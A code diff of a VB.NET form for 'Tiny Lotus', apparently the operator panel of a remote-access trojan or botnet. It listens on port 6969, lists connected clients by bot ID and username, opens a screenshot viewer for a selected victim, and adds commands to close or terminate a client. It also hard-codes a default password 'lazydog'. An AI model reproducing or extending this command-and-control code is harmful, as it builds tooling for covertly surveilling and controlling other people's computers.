@@ -7,13 +7,14 @@ Public Class frmmain
     Public clientMgr As clsClientMgr
 
     Private Delegate Sub SafeLog(ByVal text As String)
+    Dim version As String = "0.1 Alpha"
 
-    Public Sub Log(ByVal txt As String)
+    Public Sub Log(ByVal [txt] As String)
         If txtLog.InvokeRequired Then
-            Dim d = New SafeLog(AddressOf Log)
-            txtLog.Invoke(d, New Object() {Text})
+            Dim d As New SafeLog(AddressOf Log)
+            Me.Invoke(d, New Object() {[txt]})
         Else
-            txtLog.Text = txtLog.Text & DateTime.Now.ToString("[dd/MM/yyyy HH:mm:ss] ") & txt & vbCrLf
+            txtLog.Text = txtLog.Text & DateTime.Now.ToString("[dd/MM/yyyy HH:mm:ss] ") & [txt] & vbCrLf
         End If
     End Sub
 
@@ -43,6 +44,7 @@ Public Class frmmain
             With mSettings.ServerSetting
                 .Port = 6969
                 .isListening = False
+                .password = "lazydog"
             End With
         End If
         Return True
@@ -61,16 +63,16 @@ Public Class frmmain
             If listener.Server IsNot Nothing Then
                 If listener.Server.IsBound = True Then
                     Dim clientTCP As TcpClient = listener.EndAcceptTcpClient(ar)
-                    Dim clientObj As clsClientObj = New clsClientObj(clientTCP)
+                    Dim clientObj As clsClientObj = New clsClientObj(clientTCP, mSettings.ServerSetting.password)
 
-                    Log("There is a new connection")
+                    Utilities.GlobalLog("There is a new connection")
                     clientMgr.RegisterClient(clientObj)
                     Threading.Thread.Sleep(1)
                     serverTCP.BeginAcceptTcpClient(New AsyncCallback(AddressOf AcceptClientCallBack), serverTCP)
                 End If
             End If
         Catch ex As Exception
-            Log("There is an error while accept connection: " & ex.Message)
+            Utilities.GlobalLog("There is an error while accept connection: " & ex.Message)
             Return
         End Try
     End Sub
@@ -90,6 +92,7 @@ Public Class frmmain
     End Function
 
     Private Function Global_Init() As Boolean
+        SetAbout()
         Setting_Init()
         Client_Listview_Init()
         Timer_Init()
@@ -175,7 +178,7 @@ Public Class frmmain
     End Sub
 
     Private Sub SyncClientListView()
-        Dim ClientList As List(Of clsClientObj) = clientMgr.GetClientList()
+        Dim ClientList As List(Of clsClientObj) = clientMgr.GetAcceptedClientList()
 
         If ClientList.Count > lvClient.Items.Count Then
             Dim i As Integer = 0
@@ -210,7 +213,7 @@ Public Class frmmain
     End Sub
 
     Private Sub UpdateClientInfo()
-        Dim ClientList As List(Of clsClientObj) = clientMgr.GetClientList()
+        Dim ClientList As List(Of clsClientObj) = clientMgr.GetAcceptedClientList()
         For Each ClientObj As clsClientObj In ClientList
             ClientObj.UpdateInfo()
         Next
@@ -229,7 +232,7 @@ Public Class frmmain
     End Sub
 
     Private Function GetSelectedClient() As clsClientObj
-        Dim ClientList As List(Of clsClientObj) = clientMgr.GetClientList()
+        Dim ClientList As List(Of clsClientObj) = clientMgr.GetAcceptedClientList()
         For Each ClientObj As clsClientObj In ClientList
             If ClientObj.GetClientInfo.computerUserName = lvClient.FocusedItem.SubItems(4).Text _
             And ClientObj.GetClientInfo.botID = lvClient.FocusedItem.SubItems(1).Text Then
@@ -281,5 +284,38 @@ Public Class frmmain
 
         frmScreenshot.ScreenshotObj = selectedClient.GetFeaObjByID(4)
         frmScreenshot.ShowDialog()
+    End Sub
+
+    Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
+        Dim selectedClient As clsClientObj = GetSelectedClient()
+        If selectedClient Is Nothing Then
+            MsgBox("Can't get selected client", vbCritical, "Error")
+            Return
+        End If
+        Dim switchObj As clsSwitch = selectedClient.GetFeaObjByID(5)
+        switchObj.SendClose()
+    End Sub
+
+    Private Sub TerminateToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles TerminateToolStripMenuItem.Click
+        Dim selectedClient As clsClientObj = GetSelectedClient()
+        If selectedClient Is Nothing Then
+            MsgBox("Can't get selected client", vbCritical, "Error")
+            Return
+        End If
+        Dim switchObj As clsSwitch = selectedClient.GetFeaObjByID(5)
+        switchObj.SendTerminate()
+    End Sub
+
+    Private Sub SetAbout()
+        Me.Text = "Tiny Lotus " & version
+        txtAbout.Text = "Tiny Lotus" & vbCrLf &
+                        "Version: " & version & vbCrLf & vbCrLf &
+                        "Coded by" & vbCrLf &
+                        "Elvis" & vbCrLf & vbCrLf &
+                        "Library" & vbCrLf &
+                        "zlib by Jean-loup Gailly and Mark Adler" & vbCrLf &
+                        "zlibnet by gdalsnes" & vbCrLf & vbCrLf &
+                        "Thank to" & vbCrLf &
+                        "None"
     End Sub
 End Class
